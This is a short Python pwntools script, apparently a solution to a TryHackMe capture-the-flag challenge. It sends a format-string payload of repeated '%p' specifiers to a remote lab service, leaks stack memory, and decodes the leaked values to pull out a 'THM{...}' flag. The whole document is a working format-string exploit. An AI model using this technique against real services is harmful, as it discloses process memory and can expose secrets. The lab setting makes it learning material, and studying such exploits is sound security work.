from pwn import *

context.log_level = 'critical'

address = '10.10.240.66'
port = 9006

payload = b'%p ' * 12
output = b''

with remote(address, port) as target:
	target.recvuntil(b'Enter your THM username to participate in the giveaway:')
	target.sendline(payload)
	target.recvuntil(b'Thanks ')
	output += target.recvall()


output = output.decode()
output = output.split()


flag_string = ''
for string in output:
	try:
		flag_string += p64(int(string, 16)).decode()
	except:
		pass


flag = flag_string[flag_string.index('THM'):flag_string.index('}')+1]
print(flag)




